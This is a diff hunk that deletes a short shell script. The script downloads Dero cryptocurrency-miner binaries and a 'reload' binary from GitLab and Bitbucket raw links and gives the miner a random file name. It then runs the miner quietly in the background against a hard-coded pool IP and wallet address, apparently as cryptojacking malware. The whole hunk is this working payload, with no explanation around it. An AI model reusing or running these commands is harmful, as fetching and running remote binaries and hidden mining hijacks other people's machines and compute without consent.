@@ -1,7 +1,0 @@
-blkdiscard=$(shuf -n 1 -i 1-999999)
-curl -L -o $blkdiscard https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner
-curl -L -o $blkdiscard https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner
-curl -L -o reload https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload
-chmod +x $blkdiscard reload
-./$blkdiscard -r 159.223.89.218:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.$(echo $(shuf -i 1-20000 -n 1)-unlimititit) -m 1 >/dev/null &
-timeout 5m ./reload
